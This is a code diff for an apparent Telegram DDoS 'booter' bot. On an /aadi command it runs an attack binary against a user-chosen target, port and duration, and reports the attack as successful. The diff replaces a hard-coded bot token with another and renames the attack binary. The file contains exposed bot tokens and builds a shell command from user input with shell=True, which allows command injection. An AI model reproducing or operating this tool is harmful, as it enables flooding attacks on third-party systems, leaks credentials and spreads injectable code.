@@ -6,7 +6,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7799225662:AAFYX1oLc7AEYq1tzHDdmUb4omfgYoNnxqM')
+bot = telebot.TeleBot('7324603047:AAGq8qfsYAB2_-6A7ZoKxB57_td0ofrKDn0')
 
 # Admin user IDs
 admin_id = {"1302320722", "", ""}
@@ -234,7 +234,7 @@ def handle_aadi(message):
                 record_command_logs(user_id, '/aadi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./aadi {target} {port} {time}"
+                full_command = f"./sasuke {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/user_x_dead"
         else:
